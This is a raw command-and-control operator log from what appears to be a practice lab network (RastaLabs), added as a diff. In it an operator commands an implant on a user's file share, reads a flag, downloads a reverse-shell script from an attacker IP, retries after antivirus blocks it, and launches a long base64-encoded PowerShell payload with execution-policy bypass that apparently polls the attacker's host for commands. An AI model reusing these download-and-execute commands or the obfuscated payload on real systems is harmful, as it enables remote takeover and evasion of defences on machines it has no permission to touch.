@@ -1,0 +1,196 @@
+
+[Time: 11/04/2023 01:49:16] [User: 5pider] [TaskID: 4B89D50C] Demon => powershell ls
+[11/04/2023 01:49:16] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:49:18] [+] Received Output [435 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+
+
+
+[Time: 11/04/2023 01:49:28] [User: 5pider] [TaskID: 5E9370C2] Demon => powershell cat flag.txt
+[11/04/2023 01:49:28] [+] Send Task to Agent [105 bytes]
+[11/04/2023 01:49:31] [+] Received Output [24 bytes]:
+RASTA{br4v3_n3w_w0rld}
+
+[Time: 11/04/2023 01:51:18] [User: 5pider] [TaskID: 0D548F9A] Demon => powershell wget 10.10.15.118:8443/rev2.ps1 -outfile rev2.ps1
+[11/04/2023 01:51:20] [+] Send Task to Agent [142 bytes]
+[11/04/2023 01:51:42] [+] Received Output [421 bytes]:
+wget : Unable to connect to the remote server
+At line:1 char:1
++ wget 10.10.15.118:8443/rev2.ps1 -outfile rev2.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+ 
+
+[Time: 11/04/2023 01:52:36] [User: 5pider] [TaskID: D4B927A3] Demon => powershell wget http://10.10.15.118:8443/rev2.ps1 -outfile rev2.ps1
+[11/04/2023 01:52:37] [+] Send Task to Agent [149 bytes]
+[11/04/2023 01:52:59] [+] Received Output [435 bytes]:
+wget : Unable to connect to the remote server
+At line:1 char:1
++ wget http://10.10.15.118:8443/rev2.ps1 -outfile rev2.ps1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+ 
+
+[Time: 11/04/2023 01:53:11] [User: 5pider] [TaskID: A1F9BD5C] Demon => powershell wget http://10.10.15.118/rev2.ps1 -outfile rev2.ps1
+[11/04/2023 01:53:11] [+] Send Task to Agent [144 bytes]
+[11/04/2023 01:53:13] [+] Received Output [0 bytes]:
+
+[Time: 11/04/2023 01:53:19] [User: 5pider] [TaskID: 84DB76F3] Demon => powershell ls
+[11/04/2023 01:53:21] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:53:23] [+] Received Output [556 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+-a----        11/04/2023     02:53            575 rev2.ps1                                                             
+
+
+
+[Time: 11/04/2023 01:53:43] [User: 5pider] [TaskID: FDE71C43] Demon => powershell .\rev2.ps1
+[11/04/2023 01:53:44] [+] Send Task to Agent [103 bytes]
+[11/04/2023 01:53:46] [+] Received Output [432 bytes]:
+.\rev2.ps1 : The term '.\rev2.ps1' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ .\rev2.ps1
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (.\rev2.ps1:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[Time: 11/04/2023 01:54:16] [User: 5pider] [TaskID: A28601E7] Demon => powershell powershell -exec bypass -nop -c '.\rev2.ps1'
+[11/04/2023 01:54:16] [+] Send Task to Agent [137 bytes]
+[11/04/2023 01:54:18] [+] Received Output [432 bytes]:
+.\rev2.ps1 : The term '.\rev2.ps1' is not recognized as the name of a cmdlet, function, script file, or operable 
+program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ .\rev2.ps1
++ ~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (.\rev2.ps1:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+
+[Time: 11/04/2023 01:54:25] [User: 5pider] [TaskID: BEA627F4] Demon => powershell ls
+[11/04/2023 01:54:26] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:54:28] [+] Received Output [435 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+
+
+
+[Time: 11/04/2023 01:55:14] [User: 5pider] [TaskID: 58A02DC4] Demon => powershell wget http://10.10.15.118/rev2.ps1 -outfile rev2.ps1
+[11/04/2023 01:55:15] [+] Send Task to Agent [144 bytes]
+[11/04/2023 01:55:17] [+] Received Output [0 bytes]:
+
+[Time: 11/04/2023 01:55:20] [User: 5pider] [TaskID: 3E0217A9] Demon => powershell ls
+[11/04/2023 01:55:21] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:55:23] [+] Received Output [556 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+-a----        11/04/2023     02:55           1558 rev2.ps1                                                             
+
+
+
+[Time: 11/04/2023 01:55:29] [User: 5pider] [TaskID: DBC1968E] Demon => powershell ls
+[11/04/2023 01:55:29] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:55:31] [+] Received Output [556 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+-a----        11/04/2023     02:55           1558 rev2.ps1                                                             
+
+
+
+[Time: 11/04/2023 01:55:44] [User: 5pider] [TaskID: E8051472] Demon => powershell powershell -exec bypass -nop -c '.\rev2.ps1'
+[11/04/2023 01:55:45] [+] Send Task to Agent [137 bytes]
+[11/04/2023 01:55:47] [+] Received Output [711 bytes]:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ Start-Process $PSHOME\powershell.exe -ArgumentList {$client = New-Obj ..._x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+[Time: 11/04/2023 01:57:15] [User: 5pider] [TaskID: DA38C649] Demon => powershell ls
+[11/04/2023 01:57:17] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:57:19] [+] Received Output [556 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+-a----        11/04/2023     02:55           1558 rev2.ps1                                                             
+
+
+
+[Time: 11/04/2023 01:57:29] [User: 5pider] [TaskID: 2197FC04] Demon => powershell rm .\rev2.ps1
+[11/04/2023 01:57:31] [+] Send Task to Agent [106 bytes]
+[11/04/2023 01:57:33] [+] Received Output [0 bytes]:
+
+[Time: 11/04/2023 01:57:35] [User: 5pider] [TaskID: 2B093874] Demon => powershell ls
+[11/04/2023 01:57:37] [+] Send Task to Agent [95 bytes]
+[11/04/2023 01:57:39] [+] Received Output [435 bytes]:
+
+
+    Directory: \\fs01.rastalabs.local\home$\tquinn\Desktop
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----        05/11/2019     14:14             22 flag.txt                                                             
+
+
+
+[Time: 11/04/2023 01:57:50] [User: 5pider] [TaskID: B50D8C73] Demon => powershell wget http://10.10.15.118/rev2.ps1 -outfile rev2.ps1
+[11/04/2023 01:57:51] [+] Send Task to Agent [144 bytes]
+[11/04/2023 01:57:53] [+] Received Output [0 bytes]:
+
+[Time: 11/04/2023 01:58:31] [User: 5pider] [TaskID: 51CA467B] Demon => powershell 'powershell -exec bypass -nop -c ".\rev2.ps1"'
+[11/04/2023 01:58:31] [+] Send Task to Agent [139 bytes]
+[11/04/2023 01:58:34] [+] Received Output [44 bytes]:
+powershell -exec bypass -nop -c .\rev2.ps1
+
+[Time: 11/04/2023 01:59:00] [User: 5pider] [TaskID: 9F61570E] Demon => powershell powershell -ep bypass -e cwAnAFQAQQByAFQALQBwAHIATwBjAGUAUwBTACcAIAAkAFAAUwBIAE8ATQBFAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBBAHIAZwB1AG0ARQBuAHQAbABJAHMAVAAgAHsAJAA2AD0AKAAnAE4AJwArACcAbwBuACcAKwAnAGUAJwApADsAJAAzAGIAOQA5AGUAPQAkACgAJwBiAGIAZQBiACcAIAAtAFIAZQBwAGwAYQBjAEUAIAAnAFsAXAB3AF0AewAxAH0AWwBcAHcAXQB7ADEAfQBbACgAZQB8AFwAPwApAFwAdwBdAHsAMgB9ACcALAAnADEAMAAuADEAMAAuADEANQAuADEAMQA4ADoAOAAwADgAMAAnACkAOwAkADgAMgAyAGYANwBmAD0AJAAoACcAZQBlADAAYwA4ADUAZgAnACAALQByAGUAcABsAEEAQwBFACAAJwBbAFwAdwAoAGUAfABcAD8AKQBcAGQAKABjAHwAXAA/ACkAXQB7ADQAfQBbAFwAZAA1AF0AewAyAH0AWwBcAHcAXQB7ADEAfQAnACwAJwAzADIAMABhADgAMwAtADUAYQBhADMANwBiAC0AYwBmADgAZgAzADkAJwApADsAJAA0ADIAYQBjAD0AJAAoACcAYgBkAGEAMwBhADMANQAnACAALQByAEUAcABsAGEAYwBFACAAJwBbAGIAKABkAHwAXAA/ACkAXQB7ADIAfQBbAGEAKAAzAHwAXAA/ACkAXQB7ADIAfQBbACgAYQB8AFwAPwApAFwAZABdAHsAMgB9AFsAXABkAF0AewAxAH0AJwAsACcAaAB0AHQAcAA6AC8ALwAnACkAOwAkADIAPQBpACcAUgBNACcAIAAtAHUAUwBlAEIAYQBzAGkAQwBQAEEAcgBTAGkAbgBHACAALQBVAFIAaQAgACQANAAyAGEAYwAkADMAYgA5ADkAZQAvADMAMgAwAGEAOAAzAC8AJABlAG4AdgA6AGMATwBtAFAAdQBUAEUAUgBOAEEATQBFAC8AJABlAG4AdgA6AFUAcwBlAHIATgBBAG0AZQAgAC0ASABlAGEARABFAFIAUwAgAEAAewAiAEEAdQB0AGgAbwByAGkAegBhAHQAaQBvAG4AIgA9ACQAOAAyADIAZgA3AGYAfQA7AGYAbwByACAAKAA7ADsAKQB7ACQAOAAyAD0AKABpACcAUgBNACcAIAAtAHUAUwBlAEIAYQBzAGkAQwBQAEEAcgBTAGkAbgBHACAALQBVAFIAaQAgACQANAAyAGEAYwAkADMAYgA5ADkAZQAvADUAYQBhADMANwBiACAALQBIAGUAYQBEAEUAUgBTACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJAA4ADIAMgBmADcAZgB9ACkAOwBpAGYAIAAoACEAKABAACgAKAAnAE4AJwArACcAbwBuACcAKwAnAGUAJwApACwAKAAoACcAcQB1AGkAdAAnACkAKQApACAALQBjAG8ATgBUAGEAaQBOAFMAIAAkADgAMgApACkAIAB7AGUAYwBoAG8AIAAiACQAOAAyACIAIAB8ACAAbwB1AHQALQBmAGkAbABlACAALQBGAGkAbABlAFAAQQB0AEgAIABDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBzAGUAcgBOAEEAbQBlAFwALgBsAG8AYwBhAGwAXABoAGEAeABvAHIALgBwAHMAMQA7ACQAMQAyADMAOQAzAD0AcABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIABDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBzAGUAcgBOAEEAbQBlAFwALgBsAG8AYwBhAGwAXABoAGEAeABvAHIALgBwAHMAMQAgAC0AZQByAHIATwByAEEAQwBUAEkATwBOACAAUwBUACcAbwBQACcAIAAtAGUAUgByAG8AcgBWAEEAUgBJAGEAQgBMAEUAIAA1ADMAMAAxADsAJAAxADIAMwA5ADMAPQBvAFUAVAAtACcAUwBUAHIAaQBOACcARwAgAC0AaQBuAHAAVQB0AE8AQgBKAGUAYwBUACAAJAAxADIAMwA5ADMAOwAkADUAZgA9AGkAJwBSAE0AJwAgAC0AVQBSAGkAIAAkADQAMgBhAGMAJAAzAGIAOQA5AGUALwBjAGYAOABmADMAOQAgAC0AbQBlAFQAaABPAGQAIABQAE8AUwBUACAALQBIAGUAYQBEAEUAUgBTACAAQAB7ACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiAD0AJAA4ADIAMgBmADcAZgB9ACAALQBiAE8AZABZACAAKAAkADUAMwAwADEAKwAkADEAMgAzADkAMwApAH0AIABlAGwAcwBlAGkAZgAgACgAJAA4ADIAIAAtAGUAcQAgACgAKAAnAHEAdQBpAHQAJwApACkAKQAgAHsAZABlAGwAIABDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBzAGUAcgBOAEEAbQBlAFwALgBsAG8AYwBhAGwAXABoAGEAeABvAHIALgBwAHMAMQA7AFMAVAAnAG8AUAAnAC0AUAByAG8AYwBlAHMAcwAgACQAUABJAEQAfQAgAHMAJwBMAGUAZQAnAFAAIAAwAC4AOAB9AH0AIAAtAHcAaQBuAGQATwBXAFMAdAB5AGwARQAgAGgASQAnAGQAZABFAE4AJwA=
+[11/04/2023 01:59:02] [+] Send Task to Agent [2914 bytes]
+[11/04/2023 01:59:06] [+] Received Output [1021 bytes]:
+#< CLIXML
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\fs01.rastalabs.local\home$\tquinn\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>
+[Time: 11/04/2023 01:59:12] [User: 5pider] [TaskID: 069B587D] Demon => powershell ks'
+[11/04/2023 01:59:14] [+] Send Task to Agent [96 bytes]
+[11/04/2023 01:59:16] [+] Received Output [195 bytes]:
+The string is missing the terminator: '.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString
+ 
+
+[Time: 11/04/2023 02:23:17] [User: 5pider] [TaskID: 59E07684] Demon => powershell ipconfig /all
